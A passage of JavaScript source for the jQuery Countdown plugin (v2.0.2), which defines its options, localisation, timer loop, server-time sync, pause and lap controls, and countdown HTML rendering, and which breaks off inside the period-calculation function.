/* http://keith-wood.name/countdown.html
   Countdown for jQuery v2.0.2.
   Written by Keith Wood (kbwood{at}iinet.com.au) January 2008.
   Available under the MIT (http://keith-wood.name/licence.html) license. 
   Please attribute the author if you use it. */

(function($) { // Hide scope, no $ conflict

	var pluginName = 'countdown';

	var Y = 0; // Years
	var O = 1; // Months
	var W = 2; // Weeks
	var D = 3; // Days
	var H = 4; // Hours
	var M = 5; // Minutes
	var S = 6; // Seconds

	/** Create the countdown plugin.
		<p>Sets an element to show the time remaining until a given instant.</p>
		<p>Expects HTML like:</p>
		<pre>&lt;div>&lt;/div></pre>
		<p>Provide inline configuration like:</p>
		<pre>&lt;div data-countdown="name: 'value'">&lt;/div></pre>
	 	@module Countdown
		@augments JQPlugin
		@example $(selector).countdown({until: +300}) */
	$.JQPlugin.createPlugin({
	
		/** The name of the plugin. */
		name: pluginName,

		/** Countdown expiry callback.
			Triggered when the countdown expires.
			@callback expiryCallback */

		/** Countdown server synchronisation callback.
			Triggered when the countdown is initialised.
			@callback serverSyncCallback
			@return {Date} The current date/time on the server as expressed in the local timezone. */
			
		/** Countdown tick callback.
			Triggered on every <code>tickInterval</code> ticks of the countdown.
			@callback tickCallback
			@param periods {number[]} The breakdown by period (years, months, weeks, days,
					hours, minutes, seconds) of the time remaining/passed. */

		/** Countdown which labels callback.
			Triggered when the countdown is being display to determine which set of labels
			(<code>labels</code>, <code>labels1</code>, ...) are to be used for the current period value.
			@callback whichLabelsCallback
			@param num {number} The current period value.
			@return {number} The suffix for the label set to use. */
			
		/** Default settings for the plugin.
			@property until {Date|number|string} The date/time to count down to, or number of seconds
						offset from now, or string of amounts and units for offset(s) from now:
						'Y' years, 'O' months, 'W' weeks, 'D' days, 'H' hours, 'M' minutes, 'S' seconds.
			@example until: new Date(2013, 12-1, 25, 13, 30)
 until: +300
 until: '+1O -2D'
			@property [since] {Date|number|string} The date/time to count up from, or
						number of seconds offset from now, or string for unit offset(s):
						'Y' years, 'O' months, 'W' weeks, 'D' days, 'H' hours, 'M' minutes, 'S' seconds.
			@example since: new Date(2013, 1-1, 1)
 since: -300
 since: '-1O +2D'
			@property [timezone=null] {number} The timezone (hours or minutes from GMT) for the target times,
						or null for client local timezone.
			@example timezone: +10
 timezone: -60
			@property [serverSync=null] {serverSyncCallback} A function to retrieve the current server time
						for synchronisation.
			@property [format='dHMS'] {string} The format for display - upper case for always, lower case only if non-zero,
						'Y' years, 'O' months, 'W' weeks, 'D' days, 'H' hours, 'M' minutes, 'S' seconds.
			@property [layout=''] {string} Build your own layout for the countdown.
			@example layout: '{d<}{dn} {dl}{d>} {hnn}:{mnn}:{snn}'
			@property [compact=false] {boolean} True to display in a compact format, false for an expanded one.
			@property [padZeroes=false] {boolean} True to add leading zeroes
			@property [significant=0] {number} The number of periods with non-zero values to show, zero for all.
			@property [description=''] {string} The description displayed for the countdown.
			@property [expiryUrl=''] {string} A URL to load upon expiry, replacing the current page.
			@property [expiryText=''] {string} Text to display upon expiry, replacing the countdown. This may be HTML.
			@property [alwaysExpire=false] {boolean} True to trigger <code>onExpiry</code> even if target time has passed.
			@property [onExpiry=null] {expiryCallback} Callback when the countdown expires -
						receives no parameters and <code>this</code> is the containing division.
			@example onExpiry: function() {
	...
 }
			@property [onTick=null] {tickCallback} Callback when the countdown is updated -
						receives <code>number[7]</code> being the breakdown by period
						(years, months, weeks, days, hours, minutes, seconds - based on
						<code>format</code>) and <code>this</code> is the containing division.
			@example onTick: function(periods) {
 	var secs = $.countdown.periodsToSeconds(periods);
 	if (secs < 300) { // Last five minutes
		...
 	}
 }
			@property [tickInterval=1] {number} The interval (seconds) between <code>onTick</code> callbacks. */
		defaultOptions: {
			until: null,
			since: null,
			timezone: null,
			serverSync: null,
			format: 'dHMS',
			layout: '',
			compact: false,
			padZeroes: false,
			significant: 0,
			description: '',
			expiryUrl: '',
			expiryText: '',
			alwaysExpire: false,
			onExpiry: null,
			onTick: null,
			tickInterval: 1
		},

		/** Localisations for the plugin.
			Entries are objects indexed by the language code ('' being the default US/English).
			Each object has the following attributes.
			@property [labels=['Years','Months','Weeks','Days','Hours','Minutes','Seconds']] {string[]}
						The display texts for the counter periods.
			@property [labels1=['Year','Month','Week','Day','Hour','Minute','Second']] {string[]}
						The display texts for the counter periods if they have a value of 1.
						Add other <code>labels<em>n</em></code> attributes as necessary to
						cater for other numeric idiosyncrasies of the localisation.
			@property [compactLabels=['y','m','w','d']] {string[]} The compact texts for the counter periods.
			@property [whichLabels=null] {whichLabelsCallback} A function to determine which
						<code>labels<em>n</em></code> to use.
			@example whichLabels: function(num) {
	return (num > 1 ? 0 : 1);
 }
			@property [digits=['0','1',...,'9']] {number[]} The digits to display (0-9).
			@property [timeSeparator=':'] {string} Separator for time periods in the compact layout.
			@property [isRTL=false] {boolean} True for right-to-left languages, false for left-to-right. */
		regionalOptions: { // Available regional settings, indexed by language/country code
			'': { // Default regional settings - English/US
				labels: ['Years', 'Months', 'Weeks', 'Days', 'Hours', 'Minutes', 'Seconds'],
				labels1: ['Year', 'Month', 'Week', 'Day', 'Hour', 'Minute', 'Second'],
				compactLabels: ['y', 'm', 'w', 'd'],
				whichLabels: null,
				digits: ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'],
				timeSeparator: ':',
				isRTL: false
			}
		},
		
		/** Names of getter methods - those that can't be chained. */
		_getters: ['getTimes'],

		/* Class name for the right-to-left marker. */
		_rtlClass: pluginName + '-rtl',
		/* Class name for the countdown section marker. */
		_sectionClass: pluginName + '-section',
		/* Class name for the period amount marker. */
		_amountClass: pluginName + '-amount',
		/* Class name for the period name marker. */
		_periodClass: pluginName + '-period',
		/* Class name for the countdown row marker. */
		_rowClass: pluginName + '-row',
		/* Class name for the holding countdown marker. */
		_holdingClass: pluginName + '-holding',
		/* Class name for the showing countdown marker. */
		_showClass: pluginName + '-show',
		/* Class name for the description marker. */
		_descrClass: pluginName + '-descr',

		/* List of currently active countdown elements. */
		_timerElems: [],

		/** Additional setup for the countdown.
			Apply default localisations.
			Create the timer. */
		_init: function() {
			var self = this;
			this._super();
			this._serverSyncs = [];
			var now = (typeof Date.now == 'function' ? Date.now :
				function() { return new Date().getTime(); });
			var perfAvail = (window.performance && typeof window.performance.now == 'function');
			// Shared timer for all countdowns
			function timerCallBack(timestamp) {
				var drawStart = (timestamp < 1e12 ? // New HTML5 high resolution timer
					(perfAvail ? (performance.now() + performance.timing.navigationStart) : now()) :
					// Integer milliseconds since unix epoch
					timestamp || now());
				if (drawStart - animationStartTime >= 1000) {
							self._updateElems();
					animationStartTime = drawStart;
				}
				requestAnimationFrame(timerCallBack);
			}
			var requestAnimationFrame = window.requestAnimationFrame ||
				window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame ||
				window.oRequestAnimationFrame || window.msRequestAnimationFrame || null;
				// This is when we expect a fall-back to setInterval as it's much more fluid
			var animationStartTime = 0;
			if (!requestAnimationFrame || $.noRequestAnimationFrame) {
				$.noRequestAnimationFrame = null;
						setInterval(function() { self._updateElems(); }, 980); // Fall back to good old setInterval
			}
			else {
				animationStartTime = window.animationStartTime ||
					window.webkitAnimationStartTime || window.mozAnimationStartTime ||
					window.oAnimationStartTime || window.msAnimationStartTime || now();
				requestAnimationFrame(timerCallBack);
			}
		},
	
		/** Convert a date/time to UTC.
			@param tz {number} The hour or minute offset from GMT, e.g. +9, -360.
			@param year {Date|number} the date/time in that timezone or the year in that timezone.
			@param [month] {number} The month (0 - 11) (omit if <code>year</code> is a <code>Date</code>).
			@param [day] {number} The day (omit if <code>year</code> is a <code>Date</code>).
			@param [hours] {number} The hour (omit if <code>year</code> is a <code>Date</code>).
			@param [mins] {number} The minute (omit if <code>year</code> is a <code>Date</code>).
			@param [secs] {number} The second (omit if <code>year</code> is a <code>Date</code>).
			@param [ms] {number} The millisecond (omit if <code>year</code> is a <code>Date</code>).
			@return {Date} The equivalent UTC date/time.
			@example $.countdown.UTCDate(+10, 2013, 12-1, 25, 12, 0)
 $.countdown.UTCDate(-7, new Date(2013, 12-1, 25, 12, 0)) */
		UTCDate: function(tz, year, month, day, hours, mins, secs, ms) {
			if (typeof year == 'object' && year.constructor == Date) {
				ms = year.getMilliseconds();
				secs = year.getSeconds();
				mins = year.getMinutes();
				hours = year.getHours();
				day = year.getDate();
				month = year.getMonth();
				year = year.getFullYear();
			}
			var d = new Date();
			d.setUTCFullYear(year);
			d.setUTCDate(1);
			d.setUTCMonth(month || 0);
			d.setUTCDate(day || 1);
			d.setUTCHours(hours || 0);
			d.setUTCMinutes((mins || 0) - (Math.abs(tz) < 30 ? tz * 60 : tz));
			d.setUTCSeconds(secs || 0);
			d.setUTCMilliseconds(ms || 0);
			return d;
		},

		/** Convert a set of periods into seconds.
	   Averaged for months and years.
			@param periods {number[]} The periods per year/month/week/day/hour/minute/second.
			@return {number} The corresponding number of seconds.
			@example var secs = $.countdown.periodsToSeconds(periods) */
		periodsToSeconds: function(periods) {
			return periods[0] * 31557600 + periods[1] * 2629800 + periods[2] * 604800 +
				periods[3] * 86400 + periods[4] * 3600 + periods[5] * 60 + periods[6];
		},

		/** Resynchronise the countdowns with the server.
			@example $.countdown.resync() */
		resync: function() {
			var self = this;
			$('.' + this._getMarker()).each(function() { // Each countdown
				var inst = $.data(this, self.name);
				if (inst.options.serverSync) { // If synced
					var serverSync = null;
					for (var i = 0; i < self._serverSyncs.length; i++) {
						if (self._serverSyncs[i][0] == inst.options.serverSync) { // Find sync details
							serverSync = self._serverSyncs[i];
							break;
						}
					}
					if (serverSync[2] == null) { // Recalculate if missing
						var serverResult = ($.isFunction(inst.options.serverSync) ?
							inst.options.serverSync.apply(this, []) : null);
						serverSync[2] =
							(serverResult ? new Date().getTime() - serverResult.getTime() : 0) - serverSync[1];
					}
					if (inst._since) { // Apply difference
						inst._since.setMilliseconds(inst._since.getMilliseconds() + serverSync[2]);
					}
					inst._until.setMilliseconds(inst._until.getMilliseconds() + serverSync[2]);
				}
			});
			for (var i = 0; i < self._serverSyncs.length; i++) { // Update sync details
				if (self._serverSyncs[i][2] != null) {
					self._serverSyncs[i][1] += self._serverSyncs[i][2];
					delete self._serverSyncs[i][2];
				}
			}
		},

		_instSettings: function(elem, options) {
			return {_periods: [0, 0, 0, 0, 0, 0, 0]};
		},

		/** Add an element to the list of active ones.
			@private
			@param elem {Element} The countdown element. */
		_addElem: function(elem) {
			if (!this._hasElem(elem)) {
				this._timerElems.push(elem);
			}
		},

		/** See if an element is in the list of active ones.
			@private
			@param elem {Element} The countdown element.
			@return {boolean} True if present, false if not. */
		_hasElem: function(elem) {
			return ($.inArray(elem, this._timerElems) > -1);
		},

		/** Remove an element from the list of active ones.
			@private
			@param elem {Element} The countdown element. */
		_removeElem: function(elem) {
			this._timerElems = $.map(this._timerElems,
				function(value) { return (value == elem ? null : value); }); // delete entry
		},

		/** Update each active timer element.
			@private */
		_updateElems: function() {
			for (var i = this._timerElems.length - 1; i >= 0; i--) {
				this._updateCountdown(this._timerElems[i]);
			}
		},

		_optionsChanged: function(elem, inst, options) {
			if (options.layout) {
				options.layout = options.layout.replace(/&lt;/g, '<').replace(/&gt;/g, '>');
			}
			this._resetExtraLabels(inst.options, options);
			var timezoneChanged = (inst.options.timezone != options.timezone);
			$.extend(inst.options, options);
			this._adjustSettings(elem, inst,
				options.until != null || options.since != null || timezoneChanged);
			var now = new Date();
			if ((inst._since && inst._since < now) || (inst._until && inst._until > now)) {
				this._addElem(elem[0]);
			}
			this._updateCountdown(elem, inst);
		},

		/** Redisplay the countdown with an updated display.
			@private
			@param elem {Element|jQuery} The containing division.
			@param inst {object} The current settings for this instance. */
		_updateCountdown: function(elem, inst) {
			elem = elem.jquery ? elem : $(elem);
			inst = inst || this._getInst(elem);
			if (!inst) {
				return;
			}
			elem.html(this._generateHTML(inst)).toggleClass(this._rtlClass, inst.options.isRTL);
			if ($.isFunction(inst.options.onTick)) {
				var periods = inst._hold != 'lap' ? inst._periods :
					this._calculatePeriods(inst, inst._show, inst.options.significant, new Date());
				if (inst.options.tickInterval == 1 ||
						this.periodsToSeconds(periods) % inst.options.tickInterval == 0) {
					inst.options.onTick.apply(elem[0], [periods]);
				}
			}
			var expired = inst._hold != 'pause' &&
				(inst._since ? inst._now.getTime() < inst._since.getTime() :
				inst._now.getTime() >= inst._until.getTime());
			if (expired && !inst._expiring) {
				inst._expiring = true;
				if (this._hasElem(elem[0]) || inst.options.alwaysExpire) {
					this._removeElem(elem[0]);
					if ($.isFunction(inst.options.onExpiry)) {
						inst.options.onExpiry.apply(elem[0], []);
					}
					if (inst.options.expiryText) {
						var layout = inst.options.layout;
						inst.options.layout = inst.options.expiryText;
						this._updateCountdown(elem[0], inst);
						inst.options.layout = layout;
					}
					if (inst.options.expiryUrl) {
						window.location = inst.options.expiryUrl;
					}
				}
				inst._expiring = false;
			}
			else if (inst._hold == 'pause') {
				this._removeElem(elem[0]);
			}
		},

		/** Reset any extra labelsn and compactLabelsn entries if changing labels.
			@private
			@param base {object} The options to be updated.
			@param options {object} The new option values. */
		_resetExtraLabels: function(base, options) {
			for (var n in options) {
				if (n.match(/[Ll]abels[02-9]|compactLabels1/)) {
					base[n] = options[n];
				}
			}
			for (var n in base) { // Remove custom numbered labels
				if (n.match(/[Ll]abels[02-9]|compactLabels1/) && typeof options[n] === 'undefined') {
					base[n] = null;
				}
			}
		},
	
		/** Calculate internal settings for an instance.
			@private
			@param elem {jQuery} The containing division.
			@param inst {object} The current settings for this instance.
			@param recalc {boolean} True if until or since are set. */
		_adjustSettings: function(elem, inst, recalc) {
		var serverEntry = null;
		for (var i = 0; i < this._serverSyncs.length; i++) {
			if (this._serverSyncs[i][0] == inst.options.serverSync) {
				serverEntry = this._serverSyncs[i][1];
				break;
			}
		}
		if (serverEntry != null) {
				var serverOffset = (inst.options.serverSync ? serverEntry : 0);
				var now = new Date();
		}
		else {
			var serverResult = ($.isFunction(inst.options.serverSync) ?
					inst.options.serverSync.apply(elem[0], []) : null);
				var now = new Date();
				var serverOffset = (serverResult ? now.getTime() - serverResult.getTime() : 0);
			this._serverSyncs.push([inst.options.serverSync, serverOffset]);
		}
		var timezone = inst.options.timezone;
		timezone = (timezone == null ? -now.getTimezoneOffset() : timezone);
		if (recalc || (!recalc && inst._until == null && inst._since == null)) {
			inst._since = inst.options.since;
			if (inst._since != null) {
				inst._since = this.UTCDate(timezone, this._determineTime(inst._since, null));
				if (inst._since && serverOffset) {
					inst._since.setMilliseconds(inst._since.getMilliseconds() + serverOffset);
				}
			}
			inst._until = this.UTCDate(timezone, this._determineTime(inst.options.until, now));
			if (serverOffset) {
				inst._until.setMilliseconds(inst._until.getMilliseconds() + serverOffset);
			}
		}
		inst._show = this._determineShow(inst);
	},

		/** Remove the countdown widget from a div.
			@param elem {jQuery} The containing division.
			@param inst {object} The current instance object. */
		_preDestroy: function(elem, inst) {
			this._removeElem(elem[0]);
			elem.empty();
	},

		/** Pause a countdown widget at the current time.
	   Stop it running but remember and display the current time.
			@param elem {Element} The containing division.
			@example $(selector).countdown('pause') */
		pause: function(elem) {
			this._hold(elem, 'pause');
	},

		/** Pause a countdown widget at the current time.
	   Stop the display but keep the countdown running.
			@param elem {Element} The containing division.
			@example $(selector).countdown('lap') */
		lap: function(elem) {
			this._hold(elem, 'lap');
		},

		/** Resume a paused countdown widget.
			@param elem {Element} The containing division.
			@example $(selector).countdown('resume') */
		resume: function(elem) {
			this._hold(elem, null);
		},

		/** Toggle a paused countdown widget.
			@param elem {Element} The containing division.
			@example $(selector).countdown('toggle') */
		toggle: function(elem) {
			var inst = $.data(elem, this.name) || {};
			this[!inst._hold ? 'pause' : 'resume'](elem);
		},

		/** Toggle a lapped countdown widget.
			@param elem {Element} The containing division.
			@example $(selector).countdown('toggleLap') */
		toggleLap: function(elem) {
			var inst = $.data(elem, this.name) || {};
			this[!inst._hold ? 'lap' : 'resume'](elem);
		},

		/** Pause or resume a countdown widget.
			@private
			@param elem {Element} The containing division.
			@param hold {string} The new hold setting. */
		_hold: function(elem, hold) {
			var inst = $.data(elem, this.name);
		if (inst) {
			if (inst._hold == 'pause' && !hold) {
				inst._periods = inst._savePeriods;
				var sign = (inst._since ? '-' : '+');
				inst[inst._since ? '_since' : '_until'] =
					this._determineTime(sign + inst._periods[0] + 'y' +
						sign + inst._periods[1] + 'o' + sign + inst._periods[2] + 'w' +
						sign + inst._periods[3] + 'd' + sign + inst._periods[4] + 'h' + 
						sign + inst._periods[5] + 'm' + sign + inst._periods[6] + 's');
					this._addElem(elem);
			}
			inst._hold = hold;
			inst._savePeriods = (hold == 'pause' ? inst._periods : null);
				$.data(elem, this.name, inst);
				this._updateCountdown(elem, inst);
		}
	},

		/** Return the current time periods.
			@param elem {Element} The containing division.
			@return {number[]} The current periods for the countdown.
			@example var periods = $(selector).countdown('getTimes') */
		getTimes: function(elem) {
			var inst = $.data(elem, this.name);
		return (!inst ? null : (inst._hold == 'pause' ? inst._savePeriods : (!inst._hold ? inst._periods :
			this._calculatePeriods(inst, inst._show, inst.options.significant, new Date()))));
	},

		/** A time may be specified as an exact value or a relative one.
			@private
			@param setting {string|number|Date} The date/time value as a relative or absolute value.
			@param defaultTime {Date} The date/time to use if no other is supplied.
			@return {Date} The corresponding date/time. */
	_determineTime: function(setting, defaultTime) {
			var self = this;
		var offsetNumeric = function(offset) { // e.g. +300, -2
			var time = new Date();
			time.setTime(time.getTime() + offset * 1000);
			return time;
		};
		var offsetString = function(offset) { // e.g. '+2d', '-4w', '+3h +30m'
			offset = offset.toLowerCase();
			var time = new Date();
			var year = time.getFullYear();
			var month = time.getMonth();
			var day = time.getDate();
			var hour = time.getHours();
			var minute = time.getMinutes();
			var second = time.getSeconds();
			var pattern = /([+-]?[0-9]+)\s*(s|m|h|d|w|o|y)?/g;
			var matches = pattern.exec(offset);
			while (matches) {
				switch (matches[2] || 's') {
					case 's': second += parseInt(matches[1], 10); break;
					case 'm': minute += parseInt(matches[1], 10); break;
					case 'h': hour += parseInt(matches[1], 10); break;
					case 'd': day += parseInt(matches[1], 10); break;
					case 'w': day += parseInt(matches[1], 10) * 7; break;
					case 'o':
						month += parseInt(matches[1], 10); 
							day = Math.min(day, self._getDaysInMonth(year, month));
						break;
					case 'y':
						year += parseInt(matches[1], 10);
							day = Math.min(day, self._getDaysInMonth(year, month));
						break;
				}
				matches = pattern.exec(offset);
			}
			return new Date(year, month, day, hour, minute, second, 0);
		};
		var time = (setting == null ? defaultTime :
			(typeof setting == 'string' ? offsetString(setting) :
			(typeof setting == 'number' ? offsetNumeric(setting) : setting)));
		if (time) time.setMilliseconds(0);
		return time;
	},

		/** Determine the number of days in a month.
			@private
			@param year {number} The year.
			@param month {number} The month.
			@return {number} The days in that month. */
	_getDaysInMonth: function(year, month) {
		return 32 - new Date(year, month, 32).getDate();
	},

		/** Default implementation to determine which set of labels should be used for an amount.
			Use the <code>labels</code> attribute with the same numeric suffix (if it exists).
			@private
			@param num {number} The amount to be displayed.
			@return {number} The set of labels to be used for this amount. */
	_normalLabels: function(num) {
		return num;
	},

		/** Generate the HTML to display the countdown widget.
			@private
			@param inst {object} The current settings for this instance.
			@return {string} The new HTML for the countdown display. */
	_generateHTML: function(inst) {
		var self = this;
		// Determine what to show
		inst._periods = (inst._hold ? inst._periods :
			this._calculatePeriods(inst, inst._show, inst.options.significant, new Date()));
		// Show all 'asNeeded' after first non-zero value
		var shownNonZero = false;
		var showCount = 0;
		var sigCount = inst.options.significant;
		var show = $.extend({}, inst._show);
		for (var period = Y; period <= S; period++) {
			shownNonZero |= (inst._show[period] == '?' && inst._periods[period] > 0);
			show[period] = (inst._show[period] == '?' && !shownNonZero ? null : inst._show[period]);
			showCount += (show[period] ? 1 : 0);
			sigCount -= (inst._periods[period] > 0 ? 1 : 0);
		}
		var showSignificant = [false, false, false, false, false, false, false];
		for (var period = S; period >= Y; period--) { // Determine significant periods
			if (inst._show[period]) {
				if (inst._periods[period]) {
					showSignificant[period] = true;
				}
				else {
					showSignificant[period] = sigCount > 0;
					sigCount--;
				}
			}
		}
		var labels = (inst.options.compact ? inst.options.compactLabels : inst.options.labels);
		var whichLabels = inst.options.whichLabels || this._normalLabels;
		var showCompact = function(period) {
			var labelsNum = inst.options['compactLabels' + whichLabels(inst._periods[period])];
			return (show[period] ? self._translateDigits(inst, inst._periods[period]) +
				(labelsNum ? labelsNum[period] : labels[period]) + ' ' : '');
		};
		var minDigits = (inst.options.padZeroes ? 2 : 1);
		var showFull = function(period) {
			var labelsNum = inst.options['labels' + whichLabels(inst._periods[period])];
			return ((!inst.options.significant && show[period]) ||
				(inst.options.significant && showSignificant[period]) ?
					'<span class="' + self._sectionClass + '">' +
					'<span class="' + self._amountClass + '">' +
				self._minDigits(inst, inst._periods[period], minDigits) + '</span>' +
				'<span class="' + self._periodClass + '">' +
				(labelsNum ? labelsNum[period] : labels[period]) + '</span></span>' : '');
		};
		return (inst.options.layout ? this._buildLayout(inst, show, inst.options.layout,
			inst.options.compact, inst.options.significant, showSignificant) :
			((inst.options.compact ? // Compact version
			'<span class="' + this._rowClass + ' ' + this._amountClass +
			(inst._hold ? ' ' + this._holdingClass : '') + '">' + 
			showCompact(Y) + showCompact(O) + showCompact(W) + showCompact(D) + 
			(show[H] ? this._minDigits(inst, inst._periods[H], 2) : '') +
			(show[M] ? (show[H] ? inst.options.timeSeparator : '') +
			this._minDigits(inst, inst._periods[M], 2) : '') +
			(show[S] ? (show[H] || show[M] ? inst.options.timeSeparator : '') +
			this._minDigits(inst, inst._periods[S], 2) : '') :
			// Full version
			'<span class="' + this._rowClass + ' ' + this._showClass + (inst.options.significant || showCount) +
			(inst._hold ? ' ' + this._holdingClass : '') + '">' +
			showFull(Y) + showFull(O) + showFull(W) + showFull(D) +
			showFull(H) + showFull(M) + showFull(S)) + '</span>' +
			(inst.options.description ? '<span class="' + this._rowClass + ' ' + this._descrClass + '">' +
			inst.options.description + '</span>' : '')));
	},

		/** Construct a custom layout.
			@private
			@param inst {object} The current settings for this instance.
			@param show {boolean[]} Flags indicating which periods are requested.
			@param layout {string} The customised layout.
			@param compact {boolean} True if using compact labels.
			@param significant {number} The number of periods with values to show, zero for all.
			@param showSignificant {boolean[]} Other periods to show for significance.
			@return {string} The custom HTML. */
	_buildLayout: function(inst, show, layout, compact, significant, showSignificant) {
		var labels = inst.options[compact ? 'compactLabels' : 'labels'];
		var whichLabels = inst.options.whichLabels || this._normalLabels;
		var labelFor = function(index) {
			return (inst.options[(compact ? 'compactLabels' : 'labels') +
				whichLabels(inst._periods[index])] || labels)[index];
		};
		var digit = function(value, position) {
			return inst.options.digits[Math.floor(value / position) % 10];
		};
		var subs = {desc: inst.options.description, sep: inst.options.timeSeparator,
			yl: labelFor(Y), yn: this._minDigits(inst, inst._periods[Y], 1),
			ynn: this._minDigits(inst, inst._periods[Y], 2),
			ynnn: this._minDigits(inst, inst._periods[Y], 3), y1: digit(inst._periods[Y], 1),
			y10: digit(inst._periods[Y], 10), y100: digit(inst._periods[Y], 100),
			y1000: digit(inst._periods[Y], 1000),
			ol: labelFor(O), on: this._minDigits(inst, inst._periods[O], 1),
			onn: this._minDigits(inst, inst._periods[O], 2),
			onnn: this._minDigits(inst, inst._periods[O], 3), o1: digit(inst._periods[O], 1),
			o10: digit(inst._periods[O], 10), o100: digit(inst._periods[O], 100),
			o1000: digit(inst._periods[O], 1000),
			wl: labelFor(W), wn: this._minDigits(inst, inst._periods[W], 1),
			wnn: this._minDigits(inst, inst._periods[W], 2),
			wnnn: this._minDigits(inst, inst._periods[W], 3), w1: digit(inst._periods[W], 1),
			w10: digit(inst._periods[W], 10), w100: digit(inst._periods[W], 100),
			w1000: digit(inst._periods[W], 1000),
			dl: labelFor(D), dn: this._minDigits(inst, inst._periods[D], 1),
			dnn: this._minDigits(inst, inst._periods[D], 2),
			dnnn: this._minDigits(inst, inst._periods[D], 3), d1: digit(inst._periods[D], 1),
			d10: digit(inst._periods[D], 10), d100: digit(inst._periods[D], 100),
			d1000: digit(inst._periods[D], 1000),
			hl: labelFor(H), hn: this._minDigits(inst, inst._periods[H], 1),
			hnn: this._minDigits(inst, inst._periods[H], 2),
			hnnn: this._minDigits(inst, inst._periods[H], 3), h1: digit(inst._periods[H], 1),
			h10: digit(inst._periods[H], 10), h100: digit(inst._periods[H], 100),
			h1000: digit(inst._periods[H], 1000),
			ml: labelFor(M), mn: this._minDigits(inst, inst._periods[M], 1),
			mnn: this._minDigits(inst, inst._periods[M], 2),
			mnnn: this._minDigits(inst, inst._periods[M], 3), m1: digit(inst._periods[M], 1),
			m10: digit(inst._periods[M], 10), m100: digit(inst._periods[M], 100),
			m1000: digit(inst._periods[M], 1000),
			sl: labelFor(S), sn: this._minDigits(inst, inst._periods[S], 1),
			snn: this._minDigits(inst, inst._periods[S], 2),
			snnn: this._minDigits(inst, inst._periods[S], 3), s1: digit(inst._periods[S], 1),
			s10: digit(inst._periods[S], 10), s100: digit(inst._periods[S], 100),
			s1000: digit(inst._periods[S], 1000)};
		var html = layout;
		// Replace period containers: {p<}...{p>}
		for (var i = Y; i <= S; i++) {
			var period = 'yowdhms'.charAt(i);
			var re = new RegExp('\\{' + period + '<\\}([\\s\\S]*)\\{' + period + '>\\}', 'g');
			html = html.replace(re, ((!significant && show[i]) ||
				(significant && showSignificant[i]) ? '$1' : ''));
		}
		// Replace period values: {pn}
		$.each(subs, function(n, v) {
			var re = new RegExp('\\{' + n + '\\}', 'g');
			html = html.replace(re, v);
		});
		return html;
	},

		/** Ensure a numeric value has at least n digits for display.
			@private
			@param inst {object} The current settings for this instance.
			@param value {number} The value to display.
			@param len {number} The minimum length.
			@return {string} The display text. */
	_minDigits: function(inst, value, len) {
		value = '' + value;
		if (value.length >= len) {
			return this._translateDigits(inst, value);
		}
		value = '0000000000' + value;
		return this._translateDigits(inst, value.substr(value.length - len));
	},

		/** Translate digits into other representations.
			@private
			@param inst {object} The current settings for this instance.
			@param value {string} The text to translate.
			@return {string} The translated text. */
	_translateDigits: function(inst, value) {
		return ('' + value).replace(/[0-9]/g, function(digit) {
				return inst.options.digits[digit];
			});
	},

		/** Translate the format into flags for each period.
			@private
			@param inst {object} The current settings for this instance.
			@return {string[]} Flags indicating which periods are requested (?) or
					required (!) by year, month, week, day, hour, minute, second. */
	_determineShow: function(inst) {
		var format = inst.options.format;
		var show = [];
		show[Y] = (format.match('y') ? '?' : (format.match('Y') ? '!' : null));
		show[O] = (format.match('o') ? '?' : (format.match('O') ? '!' : null));
		show[W] = (format.match('w') ? '?' : (format.match('W') ? '!' : null));
		show[D] = (format.match('d') ? '?' : (format.match('D') ? '!' : null));
		show[H] = (format.match('h') ? '?' : (format.match('H') ? '!' : null));
		show[M] = (format.match('m') ? '?' : (format.match('M') ? '!' : null));
		show[S] = (format.match('s') ? '?' : (format.match('S') ? '!' : null));
		return show;
	},
	
		/** Calculate the requested periods between now and the target time.
			@private
			@param inst {object} The current settings for this instance.
			@param show {string[]} Flags indicating which periods are requested/required.
			@param significant {number} The number of periods with values to show, zero for all.
			@param now {Date} The current date and time.
			@return {number[]} The current time periods (always positive)
					by year, month, week, day, hour, minute, second. */
	_calculatePeriods: function(inst, show, significant, now) {
		// Find endpoints
		inst._now = now;
		inst._now.setMilliseconds(0);
		var until = new Date(inst._now.getTime());
		if (inst._since) {
			if (now.getTime() < inst._since.getTime()) {
				inst._now = now = until;
			}
			else {
				now = inst._since;
			}
		}
		else {
			until.setTime(inst._until.getTime());
			if (now.getTime() > inst._until.getTime()) {
				inst._now = now = until;
			}
		}
		// Calculate differences by period
		var periods = [0, 0, 0, 0, 0, 0, 0];
		if (show[Y] || show[O]) {
			// Treat end of months as the same
			var lastNow = this._getDaysInMonth(now.getFullYear(), now.getMonth());
			var lastUntil = this._getDaysInMonth(until.getFullYear(), until.getMonth());
			var sameDay = (until.getDate() == now.getDate() ||
				(until.getDate() >= Math.min(lastNow, lastUntil) &&
				now.getDate() >= Math.min(lastNow, lastUntil)));
			var getSecs = function(date) {
				return (date.getHours() * 60 + date.getMinutes()) * 60 + date.getSeconds();
			};
			var months = Math.max(0,
				(until.getFullYear() - now.getFullYear()) * 12 + until.getMonth() - now.getMonth() +
				((until.getDate() < now.getDate() && !sameDay) ||
				(sameDay && getSecs(until) < getSecs(now)) ? -1 : 0));
			periods[Y] = (show[Y] ? Math.floor(months / 12) : 0);
			periods[O] = (show[O] ? months - periods[Y] * 12 : 0);
			// Adjust for months difference and end of month if necessary
			now = new Date(now.getTime());
			var wasLastDay = (now.getDate() == lastNow);
			var lastDay = this._getDaysInMonth(now.getFullYear() + periods[Y],
				now.getMonth() + periods[O]);
			if (now.getDate() > lastDay) {
				now.setDate(lastDay);
			}
			now.setFullYear(now.getFullYear() + periods[Y]);
			now.setMonth(now.getMonth() + periods[O]);
			if (wasLastDay) {
				now.setDate(lastDay);
			}
		}
		var diff = Math.floor((until.getTime() - now.getTime()) / 1000);
		var extractPeriod = function(period, numSecs) {
			periods[period] = (show[period] ? Math.floor(diff / numSecs) : 0);
			diff -= periods[period] * numSecs;
		};
		extractPeriod(W, 604800);
		extractPeriod(D, 86400);
		extractPeriod(H, 3600);
		extractPeriod(M, 60);
		extractPeriod(S, 1);
		if (diff > 0 && !inst._since) { // Round up if left overs
			var multiplier = [1, 12, 4.3482, 7, 24, 60, 60];
			var lastShown = S;
			var max = 1;
			for (var period = S; period >= Y; period--) {
				if (show[period]) {
					if (periods[lastShown] >= max) {
						periods[lastShown] = 0;
						diff = 1;
					}
					if (diff > 0) {
						periods[period]++;
						diff = 0;
						lastShown = period;
						max = 1;
					}
				}
				max *= multiplier[period];
			}
		}
		if (significant) { // Zero out insignificant periods
